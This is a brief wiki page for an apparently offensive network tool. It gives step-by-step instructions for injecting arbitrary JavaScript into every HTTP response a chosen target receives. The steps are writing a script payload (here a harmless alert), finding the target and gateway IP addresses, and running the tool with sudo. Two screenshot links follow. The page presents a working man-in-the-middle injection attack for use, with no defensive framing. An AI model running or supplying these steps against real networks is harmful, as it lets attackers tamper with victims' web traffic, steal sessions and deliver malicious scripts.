# [wiki]::Javascript arbitrary injection
<ol>
  <li>Write this to a file:<br><code><script>alert('this is my payload!');</script></code></li>
  <li>Discover your target's ip and gateway ip: you can use <a href="https://github.com/n0nexist/subdisc">subdisc</a> for this task.</li>
  <li>Run: <code>sudo python3 main.py [target ip] [gateway ip] js my_file.js</code></li>
  <li>The payload will be injected on every http response the target gets</li>
</ol>

# Screenshots
![image_2023-03-19_11-54-22](https://user-images.githubusercontent.com/111337838/226941864-318ca2c4-f83a-4c21-87d0-cb7ec23c79b4.png)<br>
![image_2023-03-19_12-16-20](https://user-images.githubusercontent.com/111337838/226941678-172533b6-20b6-4baf-a347-76c87950b968.png)
